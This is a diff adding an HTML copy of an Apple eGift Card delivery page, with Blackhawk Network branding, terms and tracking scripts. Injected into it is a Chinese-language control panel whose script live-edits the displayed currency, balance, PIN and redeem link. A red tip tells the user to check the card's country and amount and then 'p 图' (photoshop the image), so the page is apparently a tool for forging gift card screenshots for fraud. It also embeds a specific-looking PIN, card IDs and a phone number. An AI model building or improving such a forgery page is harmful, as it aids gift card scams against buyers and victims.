@@ -1,0 +1,717 @@
+<html lang="en">
+
+<head>
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta property="og:title" content="Your Apple eGift Card">
+    <meta property="og:description"
+        content="Your Use the Apple Gift Card to get products, accessories, apps, games, music, movies, TV shows, and more. Spend it on in-app content, books, subscriptions and even iCloud storage to secure files from all your Apple devices. This gift card does it all. And then some. eGift Card">
+    <meta property="og:image"
+        content="https://content.blackhawknetwork.com/gcmimages/manufacturer/masterimage/6HXP3PGFQDSDPWJVVS0L1T9G8M-en_US.jpeg?dt=1596486061263">
+    <meta property="og:website" content="egift.activationspot.com">
+
+    <!-- 移除重复的监控脚本，仅保留必要核心 -->
+    <script async src="https://www.googletagmanager.com/gtm.js?id=GTM-K2773WN9&amp;l=adobeDataLayer"></script>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta charset="utf-8">
+    <title>Your Apple eGift Card</title>
+    <meta name="description" content="Giftcardmall.com eGift">
+    <meta name="author" content="Blackhawk Network">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="shortcut icon" type="image/x-icon"
+        href="https://content.blackhawknetwork.com/gcmimages/View/37DQFW6Z5RZR2BADH857MX9PVC/images/favicon.ico">
+
+    <!-- 样式文件合并去重 -->
+    <link rel="stylesheet" type="text/css"
+        href="https://content.blackhawknetwork.com/gcmimages/View/37DQFW6Z5RZR2BADH857MX9PVC/css/style.css?v=20240417">
+    <link rel="stylesheet" type="text/css"
+        href="https://content.blackhawknetwork.com/gcmimages/View/37DQFW6Z5RZR2BADH857MX9PVC/css/layout.css?v=20230608">
+    <link rel="stylesheet" type="text/css"
+        href="https://content.blackhawknetwork.com/gcmimages/View/37DQFW6Z5RZR2BADH857MX9PVC/css/print.css?v=20230608"
+        media="print">
+    <link type="text/css" rel="stylesheet" href="css/wallet.css?v=20150310">
+    <link type="text/css" rel="stylesheet" href="css/aselements.css">
+
+    <!-- 仅保留一次jQuery（升级至3.7.1兼容现代浏览器） -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
+
+    <!-- Google Tag Manager 标准化 -->
+    <script>
+        (function (w, d, s, l, i) {
+            w[l] = w[l] || [];
+            w[l].push({
+                'gtm.start': new Date().getTime(),
+                event: 'gtm.js'
+            });
+            var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s),
+                dl = l != 'dataLayer' ? '&l=' + l : '';
+            j.async = true;
+            j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
+            f.parentNode.insertBefore(j, f);
+        })(window, document, 'script', 'adobeDataLayer', 'GTM-K2773WN9');
+    </script>
+
+    <!-- ① 控制面板（左侧固定+列式布局+防堆叠） -->
+    <style>
+        /* 核心布局样式：左侧固定+列式排序+防堆叠 */
+        #controlPanel {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            /* 左侧固定定位 */
+            background: #fff;
+            border: 1px solid #ccc;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, .15);
+            z-index: 9999;
+            font-size: 14px;
+            display: flex;
+            flex-direction: column;
+            /* 列式排序 */
+            gap: 12px;
+            /* 间距防堆叠 */
+            width: 280px;
+            /* 固定宽度避免变形 */
+            box-sizing: border-box;
+        }
+
+        .control-group {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .control-group label {
+            font-weight: bold;
+            font-size: 13px;
+            color: #333;
+        }
+
+        .control-group input,
+        .control-group select {
+            padding: 6px 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        #pinTip {
+            color: #d00;
+            font-size: 11px;
+            margin-top: 2px;
+            display: none;
+        }
+
+        .tips-text {
+            color: #d00;
+            font-size: 16px;
+            /* 调大字体（可根据需求改14/16/18px） */
+            line-height: 1.5;
+            /* 适配行高，避免文字重叠 */
+            font-weight: bold;
+            /* 可选：加粗，更醒目 */
+            margin: 0;
+        }
+
+        /* 响应式适配：移动端自动调整 */
+        @media (max-width: 768px) {
+            #controlPanel {
+                top: 5px;
+                left: 5px;
+                width: 240px;
+                padding: 10px;
+                gap: 8px;
+            }
+
+            .control-group label {
+                font-size: 12px;
+            }
+
+            .control-group input,
+            .control-group select {
+                padding: 4px 6px;
+                font-size: 12px;
+            }
+        }
+
+        /* 主内容区域：居中显示 + 左侧边距防遮挡 */
+        .boilerplate {
+            max-width: 1200px;
+            margin: 0 auto !important;
+            /* 整体居中 */
+            padding-left: 300px !important;
+            /* 左侧留出控制面板空间 */
+            box-sizing: border-box;
+        }
+
+        #main {
+            width: 100%;
+        }
+
+        /* 移动端主内容适配 */
+        @media (max-width: 768px) {
+            .boilerplate {
+                padding-left: 260px !important;
+                max-width: 100%;
+            }
+        }
+    </style>
+
+    <!-- 控制面板 DOM 结构（移除生成按钮） -->
+    <div id="controlPanel">
+        <p class="tips-text">先查卡片的国家、金额，再去 p 图</p>
+        <div class="control-group">
+            <label>货币类型</label>
+            <select id="cur">
+                <option value="$">$ 美元</option>
+                <option value="€">€ 欧元</option>
+                <option value="£">£ 英镑</option>
+            </select>
+        </div>
+        <div class="control-group">
+            <label>卡片金额</label>
+            <input type="number" id="amt" min="1" step="1" placeholder="请输入金额">
+        </div>
+        <div class="control-group">
+            <label>PIN码（16位）</label>
+            <input type="text" id="pin" maxlength="16" placeholder="请输入16位字母/数字">
+            <div id="pinTip">PIN必须为16位字母/数字！</div>
+        </div>
+
+    </div>
+
+    <!-- 核心配置封装 -->
+    <script>
+        // 全局配置常量（统一管理魔法值）
+        const APP_CONFIG = {
+            DEFAULT_AMOUNT: 100,
+            DEFAULT_CURRENCY: '$',
+            DEFAULT_PIN: 'XQ7CN7K28CGX894P',
+            EID: 'HC64GXQBZT1YZ3J48MNFMCF6X8',
+            TID: 'YK1PHH1DX97D1S1Z9HQR847P7C',
+            COUNTRY_CODE: 'USD',
+            PRODUCT_NAME: 'Apple Gift Card',
+            PHONE_NUMBER: '07675043504'
+        };
+
+        // 工具函数封装
+        const utils = {
+            // 获取DOM元素
+            $: (selector) => document.querySelector(selector),
+            // 生成唯一ID
+            generateCorrelationId: () => crypto.randomUUID(),
+            // 格式化金额（保留货币符号）
+            formatAmount: (currency, amount) => `${currency}${amount}`
+        };
+
+        // 页面初始化逻辑
+        document.addEventListener('DOMContentLoaded', function () {
+            // 初始化全局变量（隔离作用域）
+            window.coRelationId = utils.generateCorrelationId();
+            window.asJq = jQuery.noConflict();
+
+            // 核心元素缓存
+            const amountSpan = utils.$('#sbux-amount span');
+            const pinLink = utils.$('.pin span a');
+            const pinInput = utils.$('#pin');
+            const pinTip = utils.$('#pinTip');
+            const amtInput = utils.$('#amt');
+            const curSelect = utils.$('#cur');
+
+            // 初始化输入框值
+            function initInputValues() {
+                // 货币初始化
+                const cur = amountSpan ? amountSpan.textContent[0] : APP_CONFIG.DEFAULT_CURRENCY;
+                curSelect.value = ['$', '€', '£'].includes(cur) ? cur : APP_CONFIG.DEFAULT_CURRENCY;
+
+                // 金额初始化
+                const num = amountSpan ? (amountSpan.textContent.match(/\d+/) || [APP_CONFIG.DEFAULT_AMOUNT])[0] : APP_CONFIG.DEFAULT_AMOUNT;
+                amtInput.value = num;
+
+                // PIN码初始化
+                const pin = pinLink ? pinLink.textContent : APP_CONFIG.DEFAULT_PIN;
+                pinInput.value = pin;
+                // 初始化提示隐藏
+                pinTip.style.display = 'none';
+            }
+
+            // PIN码实时校验 + 实时同步到页面
+            function initPinValidation() {
+                // 实时过滤非法字符 + 长度提示 + 同步到页面
+                pinInput.addEventListener('input', function (e) {
+                    // 仅保留大写字母和数字
+                    this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+                    // 限制最大长度16位（自动截断）
+                    if (this.value.length > 16) {
+                        this.value = this.value.slice(0, 16);
+                    }
+                    // 实时显示/隐藏提示
+                    if (this.value.length > 0 && this.value.length !== 16) {
+                        pinTip.style.display = 'block';
+                    } else {
+                        pinTip.style.display = 'none';
+                    }
+                    // 实时同步到页面（输入即生效）
+                    if (pinLink && this.value.length === 16) {
+                        pinLink.textContent = this.value;
+                        pinLink.href = pinLink.href.replace(/[A-Z0-9]{16}/, this.value);
+                    }
+                });
+
+                // 失去焦点时校验
+                pinInput.addEventListener('blur', function (e) {
+                    if (this.value.length === 0) {
+                        pinTip.style.display = 'none';
+                        return;
+                    }
+                    if (this.value.length !== 16) {
+                        pinTip.style.display = 'block';
+                        return;
+                    }
+                    pinTip.style.display = 'none';
+                });
+
+                // 获得焦点时隐藏提示
+                pinInput.addEventListener('focus', function () {
+                    if (this.value.length === 16) {
+                        pinTip.style.display = 'none';
+                    }
+                });
+            }
+
+            // 金额输入校验 + 实时同步到页面
+            function initAmountValidation() {
+                amtInput.addEventListener('input', function () {
+                    // 金额不能为空且≥1
+                    if (this.value < 1) {
+                        this.value = 1;
+                    }
+                    // 实时同步到页面（输入即生效）
+                    if (amountSpan && this.value) {
+                        amountSpan.textContent = utils.formatAmount(curSelect.value, this.value);
+                    }
+                });
+
+                // 金额失去焦点时格式化
+                amtInput.addEventListener('blur', function () {
+                    if (!this.value) {
+                        this.value = APP_CONFIG.DEFAULT_AMOUNT;
+                    } else if (this.value < 1) {
+                        this.value = 1;
+                    }
+                    // 同步到页面
+                    if (amountSpan) {
+                        amountSpan.textContent = utils.formatAmount(curSelect.value, this.value);
+                    }
+                });
+            }
+
+            // 货币切换实时同步到页面
+            function initAmountSync() {
+                // 货币切换同步
+                curSelect.addEventListener('change', function (e) {
+                    if (amountSpan && amtInput.value) {
+                        amountSpan.textContent = utils.formatAmount(e.target.value, amtInput.value);
+                    }
+                });
+            }
+
+            // 初始化所有逻辑
+            initInputValues();
+            initPinValidation();
+            initAmountValidation();
+            initAmountSync();
+        });
+    </script>
+</head>
+
+<body>
+    <div id="catalogLanDropDownParent">
+        <select name="language" id="catalogLangDropDown" style="display: none"></select>
+    </div>
+
+    <div id="widget-sign-in"></div>
+
+    <div class="boilerplate">
+        <div id="main">
+            <div class="balance">
+                <p id="sbux-amount"><span>$100</span> Apple Gift Card</p>
+            </div>
+            <div class="heading">
+                <p>Apple Store, Apple Music, iPhone,</p>
+                <p> iPad, AirPods, accessories, and more</p>
+            </div>
+            <div class="cardInfo">
+                <div class="showCard imagePos">
+                    <img src="https://content.blackhawknetwork.com/gcmimages/product/xlarge/W7SB3C6N5XV0QJA3WWGA0YWGQC_0608202322:59:18.PNG"
+                        alt="Gift Card">
+                </div>
+                <div class="pin">
+                    <p>PIN:
+                        <span><a href="https://www.appstore.com/redeem/XQ7CN7K28CGX894P"
+                                target="_blank">XQ7CN7K28CGX894P</a></span>
+                    </p>
+                </div>
+                <div class="PinInstruction">
+                    <p>To redeem, simply click on the code above.</p>
+                </div>
+            </div>
+            <div class="cardInfo2">
+                <div class="cardNum">
+                    <h2>One gift card. Everything Apple.</h2>
+                    <div class="desktop">
+                        <img src="https://content.blackhawknetwork.com/gcmimages/View/37DQFW6Z5RZR2BADH857MX9PVC/images/itunes_desktop.png"
+                            alt="logo1">
+                    </div>
+                    <div class="mobile">
+                        <img src="https://content.blackhawknetwork.com/gcmimages/View/37DQFW6Z5RZR2BADH857MX9PVC/images/mobile_icons.jpg"
+                            alt="logo2">
+                    </div>
+                    <div class="description">
+                        <p>Use the Apple Gift Card to get products, accessories, apps,</p>
+                        <p>games, music, movies, TV shows, and more. Spend it on</p>
+                        <p>in-app content, books, subscriptions and even iCloud+</p>
+                        <p>storage to secure files from all your Apple devices.</p>
+                    </div>
+                </div>
+            </div>
+            <div class="gcmCopy">
+                <div class="instructions">
+                    <div class="redeem">
+                        <h3>How to use:</h3>
+                        <span>Go to <a href="https://apple.com/redeem" target="_blank">apple.com/redeem</a> to add to
+                            your</span>
+                        <span>Apple Account. Use your balance for online and Apple Store purchases.</span>
+                    </div>
+                    <div class="wallet">
+                        <div class="image">
+                            <img src="https://content.blackhawknetwork.com/gcmimages/View/37DQFW6Z5RZR2BADH857MX9PVC/images/Wallet.png"
+                                alt="wallet_img">
+                        </div>
+                        <span>As part of Wallet, your Apple Account balance is a quick, convenient way to pay when
+                            shopping at an Apple Store or apple.com.</span>
+                    </div>
+                </div>
+            </div>
+            <div class="gcmTerms">
+                <div class="headingText">
+                    <h4 class="warning">Beware of gift card scams. Do not share your code.</h4>
+                </div>
+                <!-- 合并重复的条款文本 -->
+                <div class="terms conditions" style="display:block;">
+                    <h5>Terms and Conditions</h5>
+                    <p>Valid only for U.S. transactions in Apple properties. For assistance, visit <a
+                            href="https://support.apple.com/en-us/" target="_blank">support.apple.com/giftcard</a> or
+                        call 1-800-275-2273. Not redeemable at Apple resellers or for cash, and no resale, refunds, or
+                        exchanges, except as required by law. Apple is not responsible for unauthorized use. Terms
+                        apply; see <a href="https://apple.com/us/go/legal/gc"
+                            target="_blank">apple.com/us/go/legal/gc</a>. Issued by Apple Value Services, LLC (AVS).</p>
+                    <p>© 2025 Apple Inc. All rights reserved.</p>
+                </div>
+                <div class="extOrder" id="orderID"> </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="samsungpasscontainer"></div>
+
+    <!-- 业务逻辑封装 -->
+    <script>
+        // 钱包相关逻辑
+        async function postWallets(data) {
+            data.deviceType = navigator.userAgent;
+            const url = `/eventLogs?eid=${APP_CONFIG.EID}&tid=${APP_CONFIG.TID}`;
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data),
+                });
+            } catch (error) {
+                console.error("Wallet API Error:", error);
+            }
+        }
+
+        function walletClickEvent(wallet) {
+            const walletNames = {
+                "GOOGLE": 'Add to Google Wallet',
+                "SAMSUNG": 'Save to SAMSUNG pay',
+                "APPLE": 'Add to Apple Wallet',
+                "DEFAULT": 'Add to Wallet'
+            };
+            const data = {
+                "type": "WALLET",
+                "subTypes": [wallet],
+                "action": "CLICKED",
+                "coRelationId": window.coRelationId,
+            };
+            postWallets(data);
+            pushLinkClickEventWithoutEmail(`button|main|${walletNames[wallet] || walletNames.DEFAULT}`, walletNames[wallet] || walletNames.DEFAULT, '');
+        }
+
+        function walletsVisibleLog(samsungWalletJwt) {
+            document.getElementById("S2P-root")?.addEventListener('click', function () {
+                walletClickEvent("SAMSUNG");
+            });
+
+            const userAgent = navigator.userAgent.toLowerCase();
+            const isAppleWalletVisible = !!document.getElementById("passLink");
+            const isSamsungWalletVisible = userAgent.indexOf('iphone') === -1 && !!samsungWalletJwt;
+            const isGoogleWalletVisible = false && !isAppleWalletVisible;
+            const walletsVisible = [];
+
+            if (isAppleWalletVisible) walletsVisible.push("APPLE");
+            if (isSamsungWalletVisible) walletsVisible.push("SAMSUNG");
+            if (isGoogleWalletVisible) walletsVisible.push("GOOGLE");
+
+            if (walletsVisible.length > 0) {
+                postWallets({
+                    "type": "WALLET",
+                    "subTypes": walletsVisible,
+                    "action": "VIEWED",
+                    "coRelationId": window.coRelationId,
+                });
+            }
+        }
+
+        function shareUsingWebShareAPI() {
+            const shareData = {
+                title: 'Your eGift',
+                text: 'Sending some digital cheer your way!',
+                url: `https://egift.activationspot.com/eGiftApplication/v1/egift?tid=${APP_CONFIG.TID}&gw=n&gs=n&gcm=n&eid=${APP_CONFIG.EID}`
+            };
+
+            if (navigator.share) {
+                navigator.share(shareData)
+                    .then(() => console.log('Content shared successfully!'))
+                    .catch((error) => console.error('Error sharing content:', error));
+            } else {
+                console.log('Web Share API is not supported in this browser.');
+            }
+        }
+
+        async function generateToken(endPoint, payloadData) {
+            try {
+                payloadData.deviceType = navigator.userAgent;
+                const newWindow = window.open("", "_blank");
+                // 弹窗拦截检测
+                if (!newWindow) {
+                    alert('弹窗被浏览器拦截，请允许弹窗后重试');
+                    return;
+                }
+
+                const token = await fetch(endPoint, {
+                    method: "POST",
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payloadData)
+                })
+                    .then(res => res.text())
+                    .then(res => {
+                        const branchIoBaseUrl = '';
+                        let branchIoUrl = branchIoBaseUrl.concat(res.replace(/['"]+/g, ''));
+                        newWindow.location.href = branchIoUrl;
+                        return branchIoUrl;
+                    });
+            } catch (error) {
+                console.error("Token generation error:", error);
+            }
+        }
+
+        // Apple钱包点击事件
+        if (document.getElementById("passLink")) {
+            document.getElementById("passLink").onclick = function () {
+                walletClickEvent("APPLE");
+                window.open(`/getApplePass?eid=${APP_CONFIG.EID}&tid=${APP_CONFIG.TID}`);
+            };
+        }
+
+        function loadGiftCardAppUrl() {
+            window.open(`?requestor=BHN&account=&verification=`);
+        }
+
+        function loadGoogleWallet() {
+            walletClickEvent("GOOGLE");
+            window.open(`/google-wallets?eid=${APP_CONFIG.EID}&tid=${APP_CONFIG.TID}`);
+        }
+
+        async function loadBranchIoUrl() {
+            const payloadData = { "lastFourPhoneNumber": '', "proxyCardNumber": '' };
+            const endPoint = "/getOpenLoopToken";
+            generateToken(endPoint, payloadData);
+        }
+
+        // 合并window.onload逻辑
+        window.addEventListener('load', function () {
+            walletsVisibleLog("");
+
+            // Google Analytics 初始化
+            (function (i, s, o, g, r, a, m) {
+                i["GoogleAnalyticsObject"] = r;
+                i[r] = i[r] || function () {
+                    (i[r].q = i[r].q || []).push(arguments)
+                }, i[r].l = 1 * new Date();
+                a = s.createElement(o), m = s.getElementsByTagName(o)[0];
+                a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+            })(window, document, "script", "//www.google-analytics.com/analytics.js", "ga");
+
+            ga("create", "UA-9396103-7", "activationspot.com");
+            ga("send", "pageview");
+            ga("send", "event", "Apple", "Apple");
+        });
+
+        // jQuery逻辑封装
+        asJq(document).ready(function () {
+            // 防重复点击
+            asJq("#btnOpenLoopWallet").on('click', function (event) {
+                event.preventDefault();
+                var el = asJq(this);
+                if (el.prop('disabled')) return;
+                el.prop('disabled', true);
+                setTimeout(() => el.prop('disabled', false), 4000);
+            });
+
+            // 语言下拉框逻辑
+            let showCatalogdropdown = true;
+            const $langDropdown = asJq("#catalogLangDropDown");
+            if ($langDropdown.find('option').length <= 1 || asJq(".mainDivLn").length !== 0) {
+                $langDropdown.hide();
+                showCatalogdropdown = false;
+            }
+
+            if ($langDropdown.find('option').length >= 1 && showCatalogdropdown) {
+                let url = new URL(window.location.href);
+                let language = url.searchParams.get("lang");
+                if (language) $langDropdown.val(language);
+
+                $langDropdown.show().on('change', function () {
+                    let url = new URL(window.location.href);
+                    url.searchParams.set("lang", asJq(this).val());
+                    window.location.href = url;
+                });
+            }
+
+            // 响应式按钮逻辑
+            const buttonRow = document.querySelector('.button-row');
+            const shareButton = document.querySelector('.walletShareH');
+            const bannerTop = document.querySelector('.bannerTopH');
+            const twoBtnBanner = document.querySelector('.twoBtnBannerH');
+            const walletShare = document.querySelector('.walletShareH');
+
+            if (!shareButton && buttonRow) {
+                buttonRow.classList.add('buttonRowShowSingleBtn');
+            }
+
+            if (navigator.share) {
+                if (bannerTop) bannerTop.classList.add('bannerTop');
+                if (twoBtnBanner) twoBtnBanner.classList.add('twoBtnBanner');
+                if (walletShare) walletShare.classList.add('walletShare');
+            } else {
+                if (bannerTop) bannerTop.classList.add('noBannerTop');
+                if (twoBtnBanner) twoBtnBanner.classList.add('noTwoBtnBanner');
+                if (walletShare) walletShare.classList.add('noWalletShare');
+                if (buttonRow) buttonRow.classList.add('buttonRowShowSingleBtn');
+            }
+        });
+
+        // 页面埋点逻辑
+        function pushPageLoadEvent(eventType, pageName, url, hash, currency, amount, product, tid, phone, email, experiment, variant, userId, eventSubType) {
+            console.log(`Page event: ${eventType}`, { pageName, amount, currency });
+        }
+
+        function pushExperimentEvent(eventType, pageName, url, hash, currency, amount, product, tid, phone, email, experiment, variant, userId, eventSubType) {
+            console.log(`Experiment event: ${eventType}`, { pageName, amount, currency });
+        }
+
+        // 页面加载/卸载埋点
+        pushPageLoadEvent(
+            'page|load',
+            'egift-next',
+            'https://egift.activationspot.com',
+            'EAAQcjvAC3WOtC9HFww5+tEqQTFyFTM=',
+            APP_CONFIG.COUNTRY_CODE,
+            APP_CONFIG.DEFAULT_AMOUNT,
+            APP_CONFIG.PRODUCT_NAME,
+            APP_CONFIG.TID,
+            APP_CONFIG.PHONE_NUMBER,
+            '',
+            null,
+            'null',
+            'null',
+            'PAGE_LOAD'
+        );
+
+        window.onbeforeunload = function () {
+            pushExperimentEvent(
+                'page|load',
+                'egift-next',
+                'https://egift.activationspot.com',
+                'EAAQcjvAC3WOtC9HFww5+tEqQTFyFTM=',
+                APP_CONFIG.COUNTRY_CODE,
+                APP_CONFIG.DEFAULT_AMOUNT,
+                APP_CONFIG.PRODUCT_NAME,
+                APP_CONFIG.TID,
+                APP_CONFIG.PHONE_NUMBER,
+                '',
+                null,
+                'null',
+                'null',
+                'UNLOADED'
+            );
+        };
+
+        // Hotjar 初始化
+        if ("5228614" && "6") {
+            (function (h, o, t, j, a, r) {
+                h.hj = h.hj || function () {
+                    (h.hj.q = h.hj.q || []).push(arguments)
+                };
+                h._hjSettings = { hjid: "5228614", hjsv: "6" };
+                a = o.getElementsByTagName('head')[0];
+                r = o.createElement('script');
+                r.async = 1;
+                r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
+                a.appendChild(r);
+            })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
+        }
+
+        // New Relic 配置
+        window.NREUM || (NREUM = {});
+        NREUM.info = {
+            "errorBeacon": "bam.nr-data.net",
+            "licenseKey": "673ac2fa6e",
+            "agent": "",
+            "beacon": "bam.nr-data.net",
+            "applicationTime": 315,
+            "applicationID": "1744824188",
+            "transactionName": "ZFVbZUIHC0RWU0IMDF0fakFCDwtQdF9YERFcXFVUQkkAUF5WQkVLdHVtGA==",
+            "queueTime": 0
+        };
+    </script>
+
+    <!-- 必要的脚本引入 -->
+    <script src="scripts/googleTagManager.js"></script>
+    <script async src="https://assets.adobedtm.com/5402c6525a0d/9e9dda26e937/launch-577998b63e27.min.js"></script>
+    <script type="text/javascript"
+        src="https://content.blackhawknetwork.com/gcmimages/View/37DQFW6Z5RZR2BADH857MX9PVC/script/template.js"></script>
+    <script type="text/javascript" src="scripts/dataDomeScript.js"></script>
+    <script type="text/javascript" src="scripts/global-footer.js"></script>
+
+    <!-- 样式修正 -->
+    <style type="text/css">
+        #trackImg,
+        .gowallet-callout-container {
+            display: none !important;
+        }
+
+        #bhn_ubutton,
+        #ie_bhn_ubutton,
+        .mSaveBtn {
+            display: none !important;
+        }
+    </style>
+</body>
+
+</html>
